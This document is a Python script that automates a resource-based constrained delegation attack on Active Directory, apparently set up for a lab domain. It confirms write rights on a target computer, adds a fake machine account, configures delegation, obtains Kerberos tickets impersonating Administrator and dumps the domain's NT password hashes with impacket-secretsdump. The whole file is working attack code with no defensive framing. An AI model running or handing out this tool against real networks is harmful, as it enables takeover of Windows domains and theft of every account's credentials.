#!/usr/bin/env python3
from ldap3 import Server, Connection, ALL, NTLM
import subprocess
import os
import sys
import time

class RBCDAttack:
    def __init__(self, domain, dc_ip, user, password, target, fake_name=None, fake_password=None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.user = user
        self.password = password
        self.target = target
        self.fake_name = fake_name or "FAKE01"
        self.fake_password = fake_password or "Pass123!"
        self.conn = None
        self.spn = None

    def connect_ldap(self):
        server = Server(self.dc_ip, get_info=ALL)
        self.conn = Connection(server, user=f"{self.domain}\\{self.user}", password=self.password, authentication=NTLM, auto_bind=True)
        return self.conn

    def check_generic_write(self):
        try:
            self.conn.modify(
                f'CN={self.target},CN=Computers,DC={self.domain.replace(".", ",DC=")}',
                {'description': [('MODIFY_REPLACE', ['RBCD_test'])]}
            )
            if self.conn.result['result'] == 0:
                print("[+] GenericWrite confirmed")
                return True
        except:
            pass
        print("[-] No GenericWrite rights")
        return False

    def find_spn(self):
        print("[*] Searching for SPN on target...")
        try:
            self.conn.search(
                search_base=f"DC={self.domain.replace('.', ',DC=')}",
                search_filter=f"(&(objectClass=computer)(sAMAccountName={self.target}$))",
                attributes=['servicePrincipalName']
            )
            
            if self.conn.entries:
                spns = self.conn.entries[0].servicePrincipalName
                if spns:
                    for s in spns:
                        if s.startswith('cifs/'):
                            self.spn = s
                            print(f"[+] Found SPN: {self.spn}")
                            return True
                    
                    for s in spns:
                        if s.startswith('host/'):
                            self.spn = s.replace('host/', 'cifs/')
                            print(f"[+] Using host SPN converted: {self.spn}")
                            return True
                    
                    self.spn = f"cifs/{self.target}.{self.domain}"
                    print(f"[!] No suitable SPN found, using default: {self.spn}")
                    return True
                else:
                    self.spn = f"cifs/{self.target}.{self.domain}"
                    print(f"[!] No SPN registered, using default: {self.spn}")
                    return True
            else:
                self.spn = f"cifs/{self.target}.{self.domain}"
                print(f"[!] Target not found, using default: {self.spn}")
                return True
                
        except Exception as e:
            self.spn = f"cifs/{self.target}.{self.domain}"
            print(f"[!] Error finding SPN: {e}, using default: {self.spn}")
            return True

    def add_computer(self):
        result = subprocess.run([
            "bloodyAD", "--host", self.dc_ip, "-d", self.domain, "-u", self.user, "-p", self.password,
            "add", "computer", self.fake_name, self.fake_password
        ], capture_output=True, text=True)
        if result.returncode == 0 or "entryAlreadyExists" in result.stderr:
            print(f"[+] Machine {self.fake_name}$ ready")
            return True
        print(f"[-] Failed: {result.stderr}")
        return False

    def configure_rbcd(self):
        result = subprocess.run([
            "bloodyAD", "--host", self.dc_ip, "-d", self.domain, "-u", self.user, "-p", self.password,
            "add", "rbcd", f"{self.target}$", f"{self.fake_name}$"
        ], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] RBCD configured")
            return True
        print(f"[-] RBCD failed: {result.stderr}")
        return False

    def get_tgt(self):
        result = subprocess.run([
            "impacket-getTGT", "-dc-ip", self.dc_ip, f"{self.domain}/{self.fake_name}\\$:{self.fake_password}"
        ], capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] TGT obtained")
            return True
        print(f"[-] TGT failed: {result.stderr}")
        return False

    def get_st(self):
        users_to_try = ["Administrator", "Администратор"]
        
        for impersonate_user in users_to_try:
            print(f"[*] Trying to impersonate: {impersonate_user}")
            print(f"[*] Using SPN: {self.spn}")
            
            result = subprocess.run([
                "impacket-getST", "-spn", self.spn,
                "-impersonate", impersonate_user,
                "-dc-ip", self.dc_ip,
                "-force-forwardable",
                f"{self.domain}/{self.fake_name}\\$:{self.fake_password}"
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Ticket obtained for {impersonate_user}")
                for f in os.listdir('.'):
                    if f.endswith('.ccache'):
                        os.environ['KRB5CCNAME'] = f
                        print(f"[+] Ticket saved: {f}")
                        return True
            else:
                if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in result.stderr:
                    print(f"[-] SPN {self.spn} not found, trying alternative...")
                    if self.spn != f"cifs/{self.target}.{self.domain}":
                        self.spn = f"cifs/{self.target}.{self.domain}"
                        print(f"[*] Retrying with: {self.spn}")
                        continue
                elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in result.stderr:
                    print(f"[-] Client not found, retrying...")
                    time.sleep(1)
                else:
                    print(f"[-] Failed for {impersonate_user}: {result.stderr}")
        
        print("[-] Failed to get ticket for any user")
        return False

    def dump_hashes(self):
        if not os.environ.get('KRB5CCNAME'):
            for f in os.listdir('.'):
                if f.endswith('.ccache'):
                    os.environ['KRB5CCNAME'] = f
                    break
        
        result = subprocess.run([
            "impacket-secretsdump", "-k", "-no-pass", "-dc-ip", self.dc_ip, f"{self.target}.{self.domain}", "-just-dc"
        ], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            print("\n" + "="*50)
            print("NT HASHES:")
            print("="*50)
            for line in result.stdout.split('\n'):
                if ':' in line and 'aad3b435b51404eeaad3b435b51404ee' in line:
                    print(line)
            return result.stdout
        print(f"[-] Dump failed: {result.stderr}")
        return None

    def run(self):
        print("[*] Starting RBCD attack...")
        if not self.connect_ldap():
            return False
        if not self.check_generic_write():
            return False
        if not self.find_spn():
            return False
        if not self.add_computer():
            return False
        if not self.configure_rbcd():
            return False
        if not self.get_tgt():
            return False
        if not self.get_st():
            return False
        hashes = self.dump_hashes()
        print("\n[+] RBCD attack completed!")
        return hashes

def main():
    print("="*60)
    print("RBCD Attack Automation Tool")
    print("="*60)
    
    domain = input("Domain: ").strip() or "cs.org"
    dc_ip = input("DC IP: ").strip() or "192.168.56.102"
    user = input("Username: ").strip() or "madelena.elfrieda"
    password = input("Password: ").strip() or "sniper"
    target = input("Target computer: ").strip() or "TARGET01"
    fake_name = input("Fake computer name: ").strip() or "FAKE01"
    fake_password = input("Fake computer password: ").strip() or "Pass123!"

    attack = RBCDAttack(domain, dc_ip, user, password, target, fake_name, fake_password)
    attack.run()

if __name__ == "__main__":
    main()
